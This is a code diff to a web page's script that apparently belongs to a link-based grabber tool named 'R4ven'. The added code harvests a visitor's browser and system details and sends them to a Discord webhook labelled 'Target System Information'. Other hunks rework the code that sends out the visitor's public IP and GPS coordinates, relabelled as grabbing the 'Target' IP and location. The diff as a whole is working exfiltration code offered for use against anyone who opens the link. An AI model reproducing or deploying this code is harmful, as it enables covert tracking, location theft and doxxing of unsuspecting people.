@@ -19,6 +19,31 @@
 <script>
 var x = document.getElementById("demo");
 
+var sysinfo = (" GET " , "\n__**Uagent:**__ " + "```xl\n" + navigator.userAgent + "```" + "\n__**AppVersion:**__ " + "```xl\n" + navigator.appVersion + "```" + "```autohotkey\n" + "\nPlatform: " + navigator.platform + "\nCookies Enabled: " + navigator.cookieEnabled + "\nBrowser Language: " + navigator.language + "\nBrowser Name: "+ navigator.appName + "\nBrowser CodeName: " + navigator.appCodeName + "\nRam: " + navigator.deviceMemory + "\nCPU cores: " + navigator.hardwareConcurrency + "\nconnection: " + navigator.connection + "```");
+
+const request = new XMLHttpRequest();
+    request.open("POST", discord.webhook); //change webhook
+
+    request.setRequestHeader('Content-type', 'application/json');
+
+    var myEmbed = {
+      author: {
+        name: "Someone Opened The Link !!"
+      },
+      title: "Target System Information..",
+      description: sysinfo
+    }
+
+    var params = {
+      username: "R4ven",
+      avatar_url: "https://i.pinimg.com/originals/27/bb/72/27bb72f7f7085f9c81153ce6c7bc2605.jpg",
+      embeds: [ myEmbed ]
+    }
+
+    request.send(JSON.stringify(params));
+
+//...
+
 $.getJSON("https://api.ipify.org?format=json", function(data) {
   $("#gfg").html(data.ip);
 
@@ -29,10 +54,10 @@ $.getJSON("https://api.ipify.org?format=json", function(data) {
 
       var myEmbed = {
         author: {
-          name: "Someone clicked the link !!"
+          name: "Grabbed Taregt Ip"
         },
-        title: "Target IP address",
-        description: data.ip
+        title: "IP address:",
+        description: '```xl\n' + data.ip + '```' + '\n__**IP Details:**__ https://ip-api.com/#' + data.ip
       }
 
       var params = {
@@ -44,6 +69,7 @@ $.getJSON("https://api.ipify.org?format=json", function(data) {
       request.send(JSON.stringify(params));
 })
 
+
 function getLocation() {
   if (navigator.geolocation) {
     navigator.geolocation.getCurrentPosition(showPosition, showError);
@@ -53,7 +79,7 @@ function getLocation() {
 }
 
 function showPosition(position) {
-  var latlong = (" GET " , "__**Gps Location:**__ https://www.google.com/maps/place/" + position.coords.latitude + "," + position.coords.longitude + "\n\n__**Uagent:**__ " + navigator.userAgent);
+  var latlong = (" GET " , "```autohotkey\nLatitude:" + position.coords.latitude + "\nLongitude:" + position.coords.longitude + "```" + "\n__**Map Location:**__ https://www.google.com/maps/place/" + position.coords.latitude + "," + position.coords.longitude);
   
   const request = new XMLHttpRequest();
       request.open("POST", discord.webhook); //change webhook
@@ -62,9 +88,9 @@ function showPosition(position) {
 
       var myEmbed = {
         author: {
-          name: "Allowed location PERMISSION !!"
+          name: "Allowed Location Permission"
         },
-        title: "Fetched information...",
+        title: "Target gps location...",
         description: latlong
       }
 
